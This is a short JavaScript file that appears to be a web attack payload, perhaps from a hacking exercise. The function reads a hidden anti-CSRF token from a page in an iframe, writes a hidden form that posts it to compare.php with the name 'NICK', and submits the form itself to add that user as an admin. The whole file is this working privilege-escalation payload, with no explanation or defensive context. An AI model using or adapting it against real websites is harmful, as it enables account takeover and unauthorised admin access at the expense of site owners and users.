js.js

function doit()
{
    var name ='NICK';
    var token=document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.write('<form width="0" height="0" method="post" action="compare.php">');
    document.write('<input type="text" name="name" value="' +name +'" /><br />');
    document.write('<input type="hidden" name="token" value="' +token +'" />');
    document.write('<input type="submit" name="submit" value="Add_admin" /><br/>');
    document.write('</form>');
    document.forms[0].submit.click();
}